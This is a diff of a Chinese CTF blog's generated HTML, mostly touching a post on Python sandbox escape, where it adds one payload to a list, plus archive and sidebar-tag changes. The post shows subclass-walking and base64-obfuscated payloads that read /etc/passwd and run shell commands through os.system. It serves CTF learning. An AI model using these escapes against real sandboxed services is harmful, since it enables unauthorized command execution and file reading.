@@ -373,7 +373,7 @@ height:50vh;
 <p>看下<strong>subclasses</strong>()下的方法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[().__class__.__bases__[<span class="number">0</span>].__subclasses__()[i].__name__ <span class="keyword">for</span> i <span class="keyword">in</span> range(len(().__class__.__bases__[<span class="number">0</span>].__subclasses__()))]</span><br><span class="line">[<span class="string">'type'</span>, <span class="string">'weakref'</span>, <span class="string">'weakcallableproxy'</span>, <span class="string">'weakproxy'</span>, <span class="string">'int'</span>, <span class="string">'basestring'</span>, <span class="string">'bytearray'</span>, <span class="string">'list'</span>, <span class="string">'NoneType'</span>, <span class="string">'NotImplementedType'</span>, <span class="string">'traceback'</span>, <span class="string">'super'</span>, <span class="string">'xrange'</span>, <span class="string">'dict'</span>, <span class="string">'set'</span>, <span class="string">'slice'</span>, <span class="string">'staticmethod'</span>, <span class="string">'complex'</span>, <span class="string">'float'</span>, <span class="string">'buffer'</span>, <span class="string">'long'</span>, <span class="string">'frozenset'</span>, <span class="string">'property'</span>, <span class="string">'memoryview'</span>, <span class="string">'tuple'</span>, <span class="string">'enumerate'</span>, <span class="string">'reversed'</span>, <span class="string">'code'</span>, <span class="string">'frame'</span>, <span class="string">'builtin_function_or_method'</span>, <span class="string">'instancemethod'</span>, <span class="string">'function'</span>, <span class="string">'classobj'</span>, <span class="string">'dictproxy'</span>, <span class="string">'generator'</span>, <span class="string">'getset_descriptor'</span>, <span class="string">'wrapper_descriptor'</span>, <span class="string">'instance'</span>, <span class="string">'ellipsis'</span>, <span class="string">'member_descriptor'</span>, <span class="string">'file'</span>, <span class="string">'PyCapsule'</span>, <span class="string">'cell'</span>, <span class="string">'callable-iterator'</span>, <span class="string">'iterator'</span>, <span class="string">'long_info'</span>, <span class="string">'float_info'</span>, <span class="string">'EncodingMap'</span>, <span class="string">'fieldnameiterator'</span>, <span class="string">'formatteriterator'</span>, <span class="string">'version_info'</span>, <span class="string">'flags'</span>, <span class="string">'BaseException'</span>, <span class="string">'module'</span>, <span class="string">'NullImporter'</span>, <span class="string">'zipimporter'</span>, <span class="string">'stat_result'</span>, <span class="string">'statvfs_result'</span>, <span class="string">'WarningMessage'</span>, <span class="string">'catch_warnings'</span>, <span class="string">'_IterationGuard'</span>, <span class="string">'WeakSet'</span>, <span class="string">'Hashable'</span>, <span class="string">'classmethod'</span>, <span class="string">'Iterable'</span>, <span class="string">'Sized'</span>, <span class="string">'Container'</span>, <span class="string">'Callable'</span>, <span class="string">'dict_keys'</span>, <span class="string">'dict_items'</span>, <span class="string">'dict_values'</span>, <span class="string">'_Printer'</span>, <span class="string">'_Helper'</span>, <span class="string">'SRE_Pattern'</span>, <span class="string">'SRE_Match'</span>, <span class="string">'SRE_Scanner'</span>, <span class="string">'Quitter'</span>, <span class="string">'IncrementalEncoder'</span>, <span class="string">'IncrementalDecoder'</span>]</span><br></pre></td></tr></table></figure></p>
 <p>比较有用的有: ‘file’，’catch_warnings’<br>使用file方法可以读取文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&apos;file&apos;)</span><br><span class="line">40</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure></p>
 <p>而’catch_warnings’可以进一步构造来执行命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&apos;os&apos;].__dict__[&apos;system&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure></p>
-<p>一般payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"o"</span>+<span class="string">"s"</span>).__getattribute__(<span class="string">'sys'</span>+<span class="string">'tem'</span>)(<span class="string">"l"</span>+<span class="string">"s"</span>)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).__getattribute__(<span class="string">'sys'</span>+<span class="string">'tem'</span>)(<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>一般payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"o"</span>+<span class="string">"s"</span>).__getattribute__(<span class="string">'sys'</span>+<span class="string">'tem'</span>)(<span class="string">"l"</span>+<span class="string">"s"</span>)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).__getattribute__(<span class="string">'sys'</span>+<span class="string">'tem'</span>)(<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">&#123;(<span class="keyword">lambda</span> getthem=([x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__):getthem[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'ls'</span>))()&#125;</span><br></pre></td></tr></table></figure></p>
 <p>还有一种题是知道函数名的，下面提供一些获取函数信息的方法:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def fun(x=1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a=x*2</span><br><span class="line">    flag=&apos;neko&apos;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br></pre></td></tr></table></figure>
 <p>result:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(None, 2, &apos;neko&apos;)</span><br></pre></td></tr></table></figure></p>
@@ -1550,7 +1550,90 @@ top:50vh;
     
     
     
-    <div class="total-archive"> Total : 65 </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 66 </div>
     
     <div class="post-archive">
     
@@ -1559,6 +1642,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2018/11/03/Hitcon-Redo/" >Hitcon-Redo</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1908,45 +1996,45 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="图像处理"><span class="iconfont-archer">&#xe606;</span>图像处理</span>
-    
         <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
-    
-        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
-    
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="Reverse"><span class="iconfont-archer">&#xe606;</span>Reverse</span>
     
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
         <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
     
-        <span class="sidebar-tag-name" data-tags="Padding Orlace"><span class="iconfont-archer">&#xe606;</span>Padding Orlace</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
-        <span class="sidebar-tag-name" data-tags="RC4,A5"><span class="iconfont-archer">&#xe606;</span>RC4,A5</span>
-    
-        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
-    
-        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
+        <span class="sidebar-tag-name" data-tags="图像处理"><span class="iconfont-archer">&#xe606;</span>图像处理</span>
     
         <span class="sidebar-tag-name" data-tags="DES"><span class="iconfont-archer">&#xe606;</span>DES</span>
     
-        <span class="sidebar-tag-name" data-tags="hello"><span class="iconfont-archer">&#xe606;</span>hello</span>
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+        <span class="sidebar-tag-name" data-tags="RC4,A5"><span class="iconfont-archer">&#xe606;</span>RC4,A5</span>
+    
+        <span class="sidebar-tag-name" data-tags="hello"><span class="iconfont-archer">&#xe606;</span>hello</span>
     
         <span class="sidebar-tag-name" data-tags="Rsa"><span class="iconfont-archer">&#xe606;</span>Rsa</span>
     
+        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+    
         <span class="sidebar-tag-name" data-tags="Vigenere"><span class="iconfont-archer">&#xe606;</span>Vigenere</span>
+    
+        <span class="sidebar-tag-name" data-tags="人类观察"><span class="iconfont-archer">&#xe606;</span>人类观察</span>
     
         <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
     
-        <span class="sidebar-tag-name" data-tags="人类观察"><span class="iconfont-archer">&#xe606;</span>人类观察</span>
+        <span class="sidebar-tag-name" data-tags="Padding Orlace"><span class="iconfont-archer">&#xe606;</span>Padding Orlace</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash扩展攻击"><span class="iconfont-archer">&#xe606;</span>hash扩展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="matplotlib"><span class="iconfont-archer">&#xe606;</span>matplotlib</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="hash扩展攻击"><span class="iconfont-archer">&#xe606;</span>hash扩展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
     
@@ -1956,15 +2044,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="root-me"><span class="iconfont-archer">&#xe606;</span>root-me</span>
     
-        <span class="sidebar-tag-name" data-tags="php审计"><span class="iconfont-archer">&#xe606;</span>php审计</span>
-    
         <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
     
         <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
     
-        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
-    
         <span class="sidebar-tag-name" data-tags="仿射加密"><span class="iconfont-archer">&#xe606;</span>仿射加密</span>
+    
+        <span class="sidebar-tag-name" data-tags="php审计"><span class="iconfont-archer">&#xe606;</span>php审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="无产阶级之怒"><span class="iconfont-archer">&#xe606;</span>无产阶级之怒</span>
     
@@ -2003,29 +2091,29 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="图像处理"><span class="iconfont-archer">&#xe60a;</span>图像处理</span>
-    
         <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
-    
-        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
         <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
     
         <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
     
+        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
+    
+        <span class="sidebar-category-name" data-categories="图像处理"><span class="iconfont-archer">&#xe60a;</span>图像处理</span>
+    
         <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
     
         <span class="sidebar-category-name" data-categories="机器学习"><span class="iconfont-archer">&#xe60a;</span>机器学习</span>
     
+        <span class="sidebar-category-name" data-categories="Writeup/Crypto"><span class="iconfont-archer">&#xe60a;</span>Writeup/Crypto</span>
+    
         <span class="sidebar-category-name" data-categories="漏洞复现"><span class="iconfont-archer">&#xe60a;</span>漏洞复现</span>
     
-        <span class="sidebar-category-name" data-categories="Writeup/Crypto"><span class="iconfont-archer">&#xe60a;</span>Writeup/Crypto</span>
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
         <span class="sidebar-category-name" data-categories="matplotlib"><span class="iconfont-archer">&#xe60a;</span>matplotlib</span>
     
         <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
-    
-        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
         <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
     
